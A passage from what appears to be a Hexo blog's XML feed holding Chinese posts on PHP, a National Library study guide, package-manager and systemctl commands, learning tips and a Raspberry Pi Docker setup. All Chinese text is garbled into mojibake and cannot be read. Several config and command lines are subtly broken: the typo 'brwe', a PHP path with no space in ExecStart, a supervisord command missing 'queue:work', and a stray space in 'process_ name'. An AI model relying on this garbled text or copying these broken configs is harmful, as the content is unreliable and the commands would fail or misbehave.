¹æ®æ‰€åœ¨ä½ç½®çš„ç±»æ¥å†³å®šå®ä¾‹åŒ–å¯¹è±¡ã€‚å½“æˆ‘ä»¬åªæƒ³å®ä¾‹åŒ–å­ç±»ï¼Œå¹¶ä¸”ä¸å¸Œæœ›åç»­åœ¨å¯¹å­ç±»çš„ä½¿ç”¨ä¸­ç”±äºçˆ¶ç±»çš„å˜åŒ–å¯¹å­ç±»äº§ç”Ÿå½±å“æ—¶ï¼ŒåæœŸé™æ€ç»‘å®šå°±èƒ½å‘æŒ¥å®ƒçš„ä½œç”¨äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›½å®¶å›¾ä¹¦é¦†è‡ªä¹ ä¸å®Œå…¨æŒ‡å—</title>
      <link href="/post/the-national-library-guide/"/>
      <url>/post/the-national-library-guide/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87clzenr2j30ph0cw0y0.jpg" alt=""></p><a id="more"></a><p>æ— è®ºæ˜¯å·¥ä½œä¹‹ä½™å……ç”µï¼Œè¿˜æ˜¯èµ¶åˆ¶è®ºæ–‡ï¼Œå›½å®¶å›¾ä¹¦é¦†éƒ½æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„é€‰æ‹©ï¼Œä¸€æ–¹é¢æ˜¯æœ‰å¾ˆå¤šå…è´¹çš„è‡ªä¹ ç©ºä½ï¼Œå¦ä¸€æ–¹é¢åœ¨è¿™æ ·çš„æ°›å›´ä¸­å®¹æ˜“é›†ä¸­æ³¨æ„åŠ›ã€é«˜æ•ˆå­¦ä¹ ï¼Œæœ€é‡è¦çš„æ˜¯ï¼Œå€Ÿé˜…åŒºçš„ä¹¦ç±åªè¦ä¸å¸¦å‡ºé¦†åŒºï¼Œéƒ½å¯ä»¥å…è´¹å€Ÿé˜…ã€‚ä½†å›½å›¾ä¹Ÿæœ‰ä¸€äº›ç¼ºç‚¹ï¼šæ¯”å¦‚å…è´¹ WiFi ç”±äºä½¿ç”¨äººæ•°è¾ƒå¤šï¼Œé€Ÿåº¦éå¸¸æ…¢ï¼Œæ‰€ä»¥å¦‚æœä½ éå¸¸ä¾èµ–ç½‘ç»œï¼Œå»ºè®®ä½¿ç”¨æ‰‹æœºçƒ­ç‚¹ã€‚</p><h1 id="ä½ç½®"><a href="#ä½ç½®" class="headerlink" title="ä½ç½®"></a>ä½ç½®</h1><p>åœ°é“ 4 å·çº¿å›½å®¶å›¾ä¹¦é¦†ç«™ï¼Œæ¯—é‚»åŠ¨ç‰©å›­ã€‚</p><h1 id="å¼€æ”¾æ—¶é—´"><a href="#å¼€æ”¾æ—¶é—´" class="headerlink" title="å¼€æ”¾æ—¶é—´"></a>å¼€æ”¾æ—¶é—´</h1><p>æ€»é¦†åŒ—åŒºï¼šå‘¨ä¸€è‡³å‘¨äº”9ï¼š00â€“21ï¼š00ï¼Œå‘¨å…­å’Œå‘¨æ—¥9ï¼š00â€“17ï¼š00<br>å¤ç±é¦†ï¼šå‘¨ä¸€è‡³å‘¨äº”9ï¼š00â€“17ï¼š00<br>å°‘å¹´å„¿ç«¥é¦†ï¼šå‘¨ä¸€è‡³å‘¨æ—¥9ï¼š00â€“17ï¼š00 ï¼ˆåŒ—åŒºä¸€å±‚ä¸œä¾§ï¼‰</p><blockquote><p>ç›¸æ¯”äºç«çˆ†çš„åŒ—åŒºï¼Œå¤ç±é¦†ç›¸å¯¹å†·æ¸…è®¸å¤šã€‚åŒ—åŒº 10 ç‚¹å¤šåˆ°å¯èƒ½å°±æ‰¾ä¸åˆ°æ’åº§èƒ½ç”¨çš„åº§ä½äº†ï¼Œè€Œä¸”ä¸­åˆåƒå®Œé¥­å›æ¥åº§ä½è¿˜å¯èƒ½è¢«å ï¼Œä½†å¤ç±é¦†ä¸€æ•´å¤©éƒ½ä¼šæœ‰ç©ºä½ï¼Œè€Œä¸”è‡ªä¹ çš„äººç›¸å¯¹è¾ƒå°‘ï¼Œä¹Ÿæ›´åŠ çš„å®‰é™</p></blockquote><h1 id="å­˜å–åŒ…"><a href="#å­˜å–åŒ…" class="headerlink" title="å­˜å–åŒ…"></a>å­˜å–åŒ…</h1><p>å›½å›¾ä¸å…è®¸æºå¸¦è‡ªå·±çš„å›¾ä¹¦ä¸ä¹¦åŒ…è¿›å…¥ï¼Œå¯ä»¥åœ¨å­˜åŒ…å¤„å°†ä¹¦åŒ…å­˜å¥½ã€‚å¦‚æœæºå¸¦äº†ç”µè„‘ï¼Œåˆ™éœ€æ›´æ¢ç½‘å…œã€‚</p><h1 id="å‡ºå…¥é¡»çŸ¥"><a href="#å‡ºå…¥é¡»çŸ¥" class="headerlink" title="å‡ºå…¥é¡»çŸ¥"></a>å‡ºå…¥é¡»çŸ¥</h1><p>æ¯æ¬¡å‡ºå…¥å‡éœ€åˆ·èº«ä»½è¯æˆ–è€…è¯»è€…å¡</p><h1 id="å…³äºå€Ÿé˜…"><a href="#å…³äºå€Ÿé˜…" class="headerlink" title="å…³äºå€Ÿé˜…"></a>å…³äºå€Ÿé˜…</h1><ol><li>å€Ÿé˜…å‰é¡»åŠç†è¯»è€…è¯å¹¶ç¼´çº³æŠ¼é‡‘ï¼Œä¸­æ–‡å›¾ä¹¦ 100 å…ƒï¼Œå¤–æ–‡å›¾ä¹¦ 1000 å…ƒã€‚</li><li>å¦‚éœ€æŸ¥è¯¢å€Ÿé˜…å›¾ä¹¦çŠ¶æ€ä¸ä½ç½®ï¼Œå¯åœ¨é¦†å†…çš„å¼€æ”¾è®¡ç®—æœºæŸ¥è¯¢ï¼Œæˆ–è€…åœ¨ <a href="http://opac.nlc.cn/F?RN=737257934" target="_blank" rel="noopener">http://opac.nlc.cn/F?RN=737257934</a> æŸ¥è¯¢</li><li>ä½†å›½å›¾å€Ÿä¹¦çš„äººå®åœ¨æ˜¯å¤ªå¤šäº†ï¼Œæˆ‘ä¹‹å‰æƒ³å€Ÿçš„åŸºæœ¬ä¹¦ï¼Œä¸€ç›´éƒ½æ˜¯å¤–å€ŸçŠ¶æ€ï¼Œåæ¥å°±æ”¾å¼ƒé€€æŠ¼é‡‘äº†</li></ol><h1 id="å…³äºåƒé¥­"><a href="#å…³äºåƒé¥­" class="headerlink" title="å…³äºåƒé¥­"></a>å…³äºåƒé¥­</h1><p>å›½å›¾é™„è¿‘é¤å…è¾ƒå°‘ï¼Œæ²¡æœ‰å¤ªå¤šçš„é€‰æ‹©ï¼ŒåŒ—åŒºèƒŒåæœ‰å®¶å›½å›¾å°é¦†ï¼Œä»·æ ¼å‘³é“éƒ½è¿˜å¯ä»¥ï¼Œæˆ‘ç»å¸¸å»ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPä¹Ÿæœ‰Day</title>
      <link href="/post/php-has-day/"/>
      <url>/post/php-has-day/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006tNc79ly1g4rr5qi6qxj3097064t8y.jpg" alt=""></p><a id="more"></a><h1 id="1-ç²¾é€š-PHP-éŒ¯èª¤è™•ç†ï¼Œè®“é™¤éŒ¯æ›´è‡ªåœ¨"><a href="#1-ç²¾é€š-PHP-éŒ¯èª¤è™•ç†ï¼Œè®“é™¤éŒ¯æ›´è‡ªåœ¨" class="headerlink" title="1. ç²¾é€š PHP éŒ¯èª¤è™•ç†ï¼Œè®“é™¤éŒ¯æ›´è‡ªåœ¨"></a>1. <a href="https://www.youtube.com/watch?v=QYjklJz5ed0&list" target="_blank" rel="noopener">ç²¾é€š PHP éŒ¯èª¤è™•ç†ï¼Œè®“é™¤éŒ¯æ›´è‡ªåœ¨</a></h1><p>PHPé”™è¯¯è®¾å®š</p><ul><li>PHP é¢„è®¾ä¸º<code>E_ALL &amp; ~E_NOTICE</code>ï¼Œå³æ˜¾ç¤ºé™¤ Notice å¤–çš„æ‰€æœ‰é”™è¯¯</li><li>åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå»ºè®®å°†é”™è¯¯çº§åˆ«è®¾ç½®ä¸º E_ALL æˆ– -1ï¼Œå¼€å‘è€…åº”è¯¥å¤„ç†æ‰€æœ‰å¯èƒ½çš„ Warning &amp; Noticeï¼Œä¸è¦è®©ä»»ä½•å¯èƒ½çš„ Bug æœ‰æœºä¼šå‡ºç°ã€‚</li><li>è€æ—§ç³»ç»Ÿè¿è¡Œæ—¶ï¼Œå¯ä»¥è€ƒè™‘è®¾ç½®ä¸º 0ï¼Œé¿å…ç”¨æˆ·çœ‹åˆ°å¤§é‡çš„ Noticeä¿¡æ¯ã€‚</li><li>ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¯ä»¥è®¾ç½®ä¸º 0ï¼Œä½†å°†æ‰€æœ‰é‡è¦é”™è¯¯è®°å½•è¿› logã€‚</li></ul><p><code>set_error_handler()</code> æ–¹æ³•å¯ä»¥è‡ªå®šä¹‰é”™è¯¯å¤„ç†ï¼Œè¯¥æ–¹æ³•ä¼šè¦†ç›–ç³»ç»Ÿçš„æ ‡å‡†é”™è¯¯å¤„ç†ã€‚<br><code>error_log()</code> å¯ç”¨äºè®°å½•æ‰§è¡Œçš„é”™è¯¯ä¿¡æ¯</p><p>å¯ä»¥ä½¿ç”¨ <a href="https://github.com/Seldaek/monolog" target="_blank" rel="noopener">Monolog</a> æ¥ç®¡ç†æ—¥å¿—ä¿¡æ¯ã€‚<br>å¦‚æœå…¬å¸é‡‡ç”¨å¾®æœåŠ¡ï¼Œå¯ä»¥è€ƒè™‘å°†å•å°æœåŠ¡å™¨ç”¨ä½œæ—¥å¿—æœåŠ¡å™¨ï¼Œä»¥å…æ—¥å¿—ç©ºé—´ä¸è¶³ã€‚</p><p>PHP 7çš„ Exceptions<br><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4rqg01lb0j30nf0h9dh4.jpg" alt="PHP 7çš„ Exceptions"></p><p>å¼‚å¸¸çŠ¶å†µçš„å¤„ç†ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($jobs <span class="keyword">as</span> $job) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Queue::process($job);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (QueueException $e) &#123;</span><br><span class="line">        Mailer::send(<span class="string">'A queue job error'</span>, $message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å„ç³»ç»ŸåŒ…ç®¡ç†å·¥å…·åŠå¸¸ç”¨ç³»ç»Ÿå‘½ä»¤</title>
      <link href="/post/package-managment-tools/"/>
      <url>/post/package-managment-tools/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cm0hhup6j308c06c0st.jpg" alt=""></p><p>å¸¸è§åŒ…ç®¡ç†å·¥å…·æ€»ç»“</p><a id="more"></a><h1 id="macOS-ä¹‹-Homebrew"><a href="#macOS-ä¹‹-Homebrew" class="headerlink" title="macOS ä¹‹ Homebrew"></a>macOS ä¹‹ Homebrew</h1><table><thead><tr><th>å‘½ä»¤</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>brew search &lt;package-name&gt;</code></td><td>æœç´¢è½¯ä»¶</td></tr><tr><td><code>brew install &lt;package-name&gt;</code></td><td>å®‰è£…è½¯ä»¶</td></tr><tr><td><code>brew uninstall &lt;package-name&gt;</code></td><td>å¸è½½è½¯ä»¶</td></tr><tr><td><code>brew list</code></td><td>åˆ—å‡ºå·²å®‰è£…è½¯ä»¶</td></tr><tr><td><code>brew info &lt;package-name&gt;</code></td><td>æ˜¾ç¤ºè½¯ä»¶ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç‰ˆæœ¬ä¿¡æ¯ã€ä¾èµ–ä¿¡æ¯ã€å¯åŠ¨å‘½ä»¤ç­‰</td></tr><tr><td><code>brew outdated</code></td><td>æ£€æŸ¥å¯æ›´æ–°è½¯ä»¶</td></tr><tr><td><code>brew update</code></td><td>æ›´æ–°å¾…æ›´æ–°çš„è½¯ä»¶</td></tr><tr><td><code>brew cleanup</code></td><td>æ¸…ç†è½¯ä»¶å®‰è£…åŒ…</td></tr><tr><td><code>brew services list</code></td><td>æŸ¥çœ‹brewå®‰è£…è½¯ä»¶çš„å¼€æœºå¯åŠ¨é¡¹</td></tr><tr><td><code>brew services cleanup</code></td><td>æ¸…é™¤æ— æ•ˆçš„å¼€æœºå¯åŠ¨é¡¹</td></tr><tr><td><code>brew switch &lt;package-name&gt; &lt;version&gt;</code></td><td>åˆ‡æ¢åŒä¸€è½¯ä»¶çš„ä¸åŒç‰ˆæœ¬</td></tr><tr><td><code>brew doctor</code></td><td>æŸ¥çœ‹æ˜¯å¦æœ‰è½¯ä»¶é…ç½®å¼‚å¸¸</td></tr></tbody></table><h1 id="macOS-ä¹‹-Homebrew-Cask"><a href="#macOS-ä¹‹-Homebrew-Cask" class="headerlink" title="macOS ä¹‹ Homebrew Cask"></a>macOS ä¹‹ Homebrew Cask</h1><p>Homebrew Cask æ˜¯ä¸€ä¸ªç±»ä¼¼äº App Store çš„ç»ˆç«¯è½¯ä»¶å®‰è£…å·¥å…·ï¼Œå‘½ä»¤ä¸ <code>brew</code> ç›¸ä¼¼ï¼Œå…¶å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š</p><table><thead><tr><th>å‘½ä»¤</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>brew cask search &lt;app-name&gt;</code></td><td>æœç´¢è½¯ä»¶</td></tr><tr><td><code>brew cask install &lt;app1&gt; &lt;app2&gt; ...</code></td><td>å®‰è£…è½¯ä»¶</td></tr><tr><td><code>brew cask uninstall &lt;app1&gt; &lt;app2&gt; ...</code></td><td>å¸è½½è½¯ä»¶</td></tr><tr><td><code>brew cask info &lt;app-name&gt;</code></td><td>æŸ¥çœ‹è½¯ä»¶ä¿¡æ¯</td></tr><tr><td><code>brwe cask list</code></td><td>åˆ—å‡ºå·²å®‰è£…è½¯ä»¶</td></tr></tbody></table><h1 id="CentOS-ä¹‹-yum"><a href="#CentOS-ä¹‹-yum" class="headerlink" title="CentOS ä¹‹ yum"></a>CentOS ä¹‹ yum</h1><table><thead><tr><th>å‘½ä»¤</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>yum search &lt;package-name&gt;</code></td><td>æœç´¢è½¯ä»¶åŒ…</td></tr><tr><td><code>yum install &lt;package-name&gt;</code></td><td>å®‰è£…è½¯ä»¶</td></tr><tr><td><code>yum remove &lt;package-name&gt;</code></td><td>å¸è½½è½¯ä»¶</td></tr><tr><td><code>yum update &lt;package-name&gt;</code></td><td>æ›´æ–°è½¯ä»¶</td></tr><tr><td><code>yum check-update</code></td><td>æ£€æŸ¥å¯æ›´æ–°è½¯ä»¶</td></tr><tr><td><code>yum provides &lt;command&gt;</code></td><td>æŸ¥çœ‹æ”¯æŒæŸä¸ªå‘½ä»¤çš„åŒ…</td></tr></tbody></table><h1 id="Ubuntu-Debian-ä¹‹-apt"><a href="#Ubuntu-Debian-ä¹‹-apt" class="headerlink" title="Ubuntu/Debian ä¹‹ apt"></a>Ubuntu/Debian ä¹‹ apt</h1><table><thead><tr><th>å‘½ä»¤</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>apt search &lt;package-name&gt;</code></td><td>æœç´¢è½¯ä»¶åŒ…</td></tr><tr><td><code>apt install &lt;package-name&gt;</code></td><td>å®‰è£…è½¯ä»¶</td></tr><tr><td><code>apt remove &lt;package-name&gt;</code></td><td>å¸è½½è½¯ä»¶</td></tr><tr><td><code>apt info &lt;package-name&gt;</code></td><td>æŸ¥çœ‹è½¯ä»¶ä¿¡æ¯</td></tr><tr><td><code>apt update</code></td><td>æ›´æ–°è½¯ä»¶</td></tr><tr><td><code>apt list --upgradeable</code></td><td>æ£€æŸ¥å¯æ›´æ–°è½¯ä»¶</td></tr><tr><td><code>apt list --installed</code></td><td>åˆ—å‡ºå·²å®‰è£…è½¯ä»¶</td></tr><tr><td><code>apt upgrade</code></td><td>å‡çº§è½¯ä»¶</td></tr><tr><td><code>apt autoclean</code></td><td>åˆ é™¤æ‰€æœ‰è½¯ä»¶ç¼“å­˜</td></tr><tr><td><code>apt autoremove</code></td><td>åˆ é™¤ç³»ç»Ÿä¸å†ä½¿ç”¨çš„å­¤ç«‹è½¯ä»¶</td></tr></tbody></table><h1 id="CentOS-ä¹‹-systemctl"><a href="#CentOS-ä¹‹-systemctl" class="headerlink" title="CentOS ä¹‹ systemctl"></a>CentOS ä¹‹ systemctl</h1><table><thead><tr><th>å‘½ä»¤</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>systemctl list-unit-files</code></td><td>åˆ—å‡ºæ‰€æœ‰å¯ç”¨æœåŠ¡</td></tr><tr><td><code>systemctl list-units</code></td><td>åˆ—å‡ºæ‰€æœ‰è¿è¡Œä¸­çš„æœåŠ¡</td></tr><tr><td><code>systemctl --failed</code></td><td>åˆ—å‡ºæ‰€æœ‰å¤±è´¥çš„æœåŠ¡</td></tr><tr><td>systemctl list-unit-files &#124; grep enable</td><td>æŸ¥çœ‹è‡ªå¯åŠ¨çš„è½¯ä»¶</td></tr><tr><td><code>systemctl is-enabled &lt;service-name&gt;</code></td><td>æŸ¥çœ‹æŸä¸ªæœåŠ¡æ˜¯å¦å¼€æœºå¯åŠ¨</td></tr><tr><td><code>systemctl status &lt;service-name&gt;</code></td><td>æŸ¥çœ‹æœåŠ¡çŠ¶æ€</td></tr><tr><td><code>systemctl start &lt;service-name&gt;</code></td><td>å¯åŠ¨æŸä¸ªæœåŠ¡</td></tr><tr><td><code>systemctl restart &lt;service-name&gt;</code></td><td>é‡å¯æŸä¸ªæœåŠ¡</td></tr><tr><td><code>systemctl stop &lt;service-name&gt;</code></td><td>åœæ­¢æŸä¸ªæœåŠ¡</td></tr><tr><td><code>systemctl daemon-reload</code></td><td>é‡è½½æœåŠ¡é…ç½®æ–‡ä»¶</td></tr><tr><td><code>systemctl reload &lt;service-name&gt;</code></td><td>é‡è½½æœåŠ¡</td></tr><tr><td><code>systemctl enable &lt;service-name&gt;</code></td><td>è®¾ç½®å¼€æœºè‡ªå¯åŠ¨</td></tr><tr><td><code>systemctl disable &lt;service-name&gt;</code></td><td>å…³é—­å¼€æœºè‡ªå¯åŠ¨</td></tr><tr><td><code>systemctl kill &lt;service-name&gt;</code></td><td>æ€æ­»æœåŠ¡</td></tr></tbody></table><p>Systemd è®¾ç½®ç¤ºä¾‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line"><span class="attribute">Description</span>=Laravel<span class="built_in"> queue </span>worker</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"><span class="attribute">User</span>=www-data</span><br><span class="line"><span class="attribute">Group</span>=www-data</span><br><span class="line"><span class="attribute">Restart</span>=on-failure</span><br><span class="line"><span class="attribute">ExecStart</span>=/usr/bin/php/path/to/laravel/artisan queue:work <span class="attribute">--sleep</span>=3 <span class="attribute">--tries</span>=3</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line"><span class="attribute">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure><h1 id="Ubuntu-Debian-ä¹‹-supervisorctl"><a href="#Ubuntu-Debian-ä¹‹-supervisorctl" class="headerlink" title="Ubuntu/Debian ä¹‹ supervisorctl"></a>Ubuntu/Debian ä¹‹ supervisorctl</h1><table><thead><tr><th>å‘½ä»¤</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>supervisorctl start &lt;service-name&gt;</code></td><td>å¯åŠ¨æœåŠ¡</td></tr><tr><td><code>supervisorctl stop &lt;service-name&gt;</code></td><td>åœæ­¢æœåŠ¡</td></tr><tr><td><code>supervisorctl restart &lt;service-name&gt;</code></td><td>é‡å¯æœåŠ¡</td></tr><tr><td><code>supervisorctl status &lt;service-name&gt;</code></td><td>æŸ¥çœ‹æœåŠ¡çŠ¶æ€</td></tr><tr><td><code>supervisorctl update</code></td><td>æ›´æ–°æœåŠ¡</td></tr></tbody></table><p>Supervisord è®¾ç½®ç¤ºä¾‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[program:laravel-worker]</span><br><span class="line">process_ <span class="attribute">name</span>=%(program_name)s_%(processnum)02d</span><br><span class="line"><span class="attribute">command</span>=/usr/bin/php/path/to/laravel/artisan <span class="attribute">--sleep</span>=3 <span class="attribute">--tries</span>=3</span><br><span class="line"><span class="attribute">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attribute">autorestart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attribute">user</span>=www</span><br><span class="line"><span class="attribute">numprocs</span>=8</span><br><span class="line">redirect_ <span class="attribute">stderr</span>=<span class="literal">true</span></span><br><span class="line"><span class="attribute">stdout_logfile</span>=/var/www/html/storage/logs/worker.log</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¼–ç¨‹å­¦ä¹ æ–¹æ³•</title>
      <link href="/post/how-to-learn-programming/"/>
      <url>/post/how-to-learn-programming/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87codalcgj319i0h2jt4.jpg" alt=""></p><p>ä¸€å¤©å¾ˆé•¿ï¼Œä¸€ç”Ÿå¾ˆçŸ­ã€‚</p><a id="more"></a><ol><li>ä¸æ–­ç»ƒä¹ <br>Learn by doing!</li><li>å®˜æ–¹æ–‡æ¡£<br>å¿«é€Ÿã€å‡†ç¡®ã€é«˜æ•ˆ</li><li>Oâ€™Reilly ç­‰ç»å…¸ä¹¦ç±<br>ä½“ç³»åŒ–çŸ¥è¯†ï¼Œè¡Œä¸šå¤§ç‰›å¤šå¹´ç»éªŒï¼Œç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šã€‚</li><li>GitHub<br>ä¼˜ç§€å¼€æºé¡¹ç›®è®©ä½ äº‹åŠåŠŸå€<br>GitHub Trending è®©ä½ äº†è§£å½“å‰è¡Œä¸šçƒ­ç‚¹</li><li>Google<br>ä½ æ‰€é‡åˆ°çš„ 99% çš„é—®é¢˜ Google éƒ½çŸ¥é“ç­”æ¡ˆ</li><li>YouTube<br>æ¥è‡ªä¸–ç•Œå„åœ°çš„è§†é¢‘æ•™ç¨‹ä¸åˆ†äº«</li><li>Stack Overflow<br>é«˜æ•ˆè§£å†³é—®é¢˜</li><li>Hacker News<br>æ¥è‡ªå…¨çƒçš„è¡Œä¸šæœ€æ–°èµ„è®¯</li><li>reddit<br>äº’è”ç½‘é¦–é¡µ</li></ol>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ ‘è“æ´¾ä»é›¶å®‰è£… Docker</title>
      <link href="/post/install-docker-on-pi/"/>
      <url>/post/install-docker-on-pi/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4d44ll1ydj31a90ijjuz.jpg" alt=""></p><p>Write Once, Run Everywhere.</p><a id="more"></a><p>ä»Šå¤©æ ‘è“æ´¾åˆšåˆšå‘å¸ƒäº†<a href="https://www.raspberrypi.org/blog/raspberry-pi-4-on-sale-now-from-35/" target="_blank" rel="noopener">æ ‘è“æ´¾ 4</a>ï¼Œä»¥ä¸‹æ˜¯æœ¬æ¬¡å‡çº§çš„ä¸»è¦å˜åŒ–ï¼š</p><ul><li>A 1.5GHz quad-core 64-bit ARM Cortex-A72 CPU (~3Ã— performance)</li><li>1GB, 2GB, or 4GB of LPDDR4 SDRAM</li><li>Full-throughput Gigabit Ethernet</li><li>Dual-band 802.11ac wireless networking</li><li>Bluetooth 5.0</li><li>Two USB 3.0 and two USB 2.0 ports</li><li>Dual monitor support, at resolutions up to 4K</li><li>VideoCore VI graphics, supporting OpenGL ES 3.x</li><li>4Kp60 hardware decode of HEVC video</li><li>Complete compatibility with earlier Raspberry Pi products</li></ul><p>è™½ç„¶çœŸé¦™ï¼Œä½†æƒ³èµ·æˆ‘è¿˜åœ¨åƒç°çš„ 3Bï¼Œäºæ˜¯æ‰“ç®—å…ˆæŠŠ 3B ç”¨èµ·æ¥ã€‚é‚£æˆ‘ä»¬å°±ä»å¤´å¼€å§‹å§ã€‚</p><p>æ ‘è“æ´¾æ˜¯åŸºäºARMæ¶æ„çš„ï¼Œå’Œä¸PCä¸åŒã€‚æ‰€ä»¥ä¸€äº›æ ‘è“æ´¾ä¸Šçš„é•œåƒæ— æ³•åœ¨PCä¸Šè¿è¡Œï¼Œåä¹‹äº¦ç„¶ã€‚å¦‚æœéœ€è¦æ‰¾æ ‘è“æ´¾ä¸“ç”¨çš„é•œåƒï¼Œåœ¨ Dockerhub ä¸Šæœç´¢ ARM æˆ– Rpi ç­‰ç›¸å…³å…³é”®è¯å³å¯ã€‚</p><p>æˆ‘ä»¬è®²è§£ä¸¤ç§ docker å®‰è£…æ–¹å¼ï¼š</p><h1 id="æ–¹å¼ä¸€ï¼šæ‰‹åŠ¨å®‰è£…"><a href="#æ–¹å¼ä¸€ï¼šæ‰‹åŠ¨å®‰è£…" class="headerlink" title="æ–¹å¼ä¸€ï¼šæ‰‹åŠ¨å®‰è£…"></a>æ–¹å¼ä¸€ï¼šæ‰‹åŠ¨å®‰è£…</h1><h2 id="å®‰è£…ç¯å¢ƒ"><a href="#å®‰è£…ç¯å¢ƒ" class="headerlink" title="å®‰è£…ç¯å¢ƒ"></a>å®‰è£…ç¯å¢ƒ</h2><blockquote><p>macOS 10.14.5<br>Raspberry 3B<br>Pi OS Version: Raspbian Buster Lite<br>balenaEtcher Version: 1.5.50</p></blockquote><h2 id="Step-1-ä¸‹è½½ç³»ç»Ÿ"><a href="#Step-1-ä¸‹è½½ç³»ç»Ÿ" class="headerlink" title="Step 1 ä¸‹è½½ç³»ç»Ÿ"></a>Step 1 ä¸‹è½½ç³»ç»Ÿ</h2><p>å‰å¾€æ ‘è“æ´¾å®˜ç½‘<a href="https://www.raspberrypi.org/downloads/" target="_blank" rel="noopener">ä¸‹è½½</a>æ‰€éœ€ç³»ç»Ÿï¼Œç”±äºæ‰‹å¤´åªæœ‰ä¸€å¼  16G çš„å†…å­˜å¡ï¼ŒåŒæ—¶ä¸ºäº†å°†ç³»ç»Ÿèµ„æºç”¨åœ¨æ‰§è¡Œä»»åŠ¡è€Œéæ¡Œé¢ä¸Šï¼Œå› æ­¤æˆ‘é€‰æ‹©çš„æ˜¯ Raspbian Buster Liteã€‚</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4d3gmin6rj30rk0fmac7.jpg" alt=""></p><p>ç³»ç»Ÿä¸‹è½½å®Œæˆåï¼Œè§£å‹ zip åŒ…ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªåç¼€ä¸º .img çš„é•œåƒåŒ…ã€‚</p><h2 id="Step-2-çƒ§å½•ç³»ç»Ÿ"><a href="#Step-2-çƒ§å½•ç³»ç»Ÿ" class="headerlink" title="Step 2 çƒ§å½•ç³»ç»Ÿ"></a>Step 2 çƒ§å½•ç³»ç»Ÿ</h2><p>å‰å¾€ <a href="https://www.balena.io/etcher/" target="_blank" rel="noopener">https://www.balena.io/etcher/</a> ä¸‹è½½çƒ§å½•å·¥å…·ï¼Œè¯¥å·¥å…·æ”¯æŒ Macã€Windowsã€Linux ç³»ç»Ÿï¼ˆç»ˆäºä¸ç”¨åœ¨è™šæ‹Ÿæœºé‡Œå¤„ç†äº†ï¼‰ï¼Œæ¥ä¸‹æ¥ï¼Œæ‰“å¼€ balenaEtcherï¼Œæ’å…¥å†…å­˜å¡ï¼Œé€‰æ‹©ä¸Šä¸€æ­¥çš„ img é•œåƒåŒ…ï¼Œç‚¹å‡» Flash æŒ‰é’®ï¼Œç­‰å¾…çƒ§å½•å®Œæˆ</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4d3ihshskj30ma0b9aan.jpg" alt=""></p><blockquote><p>æ³¨æ„ï¼šå¦‚æœç›´æ¥å°†è§£å‹çš„é•œåƒåŒ…å†…å®¹æ‹·è´åˆ°å†…å­˜å¡ä¸­ï¼Œä¼šå‡ºç°æ— 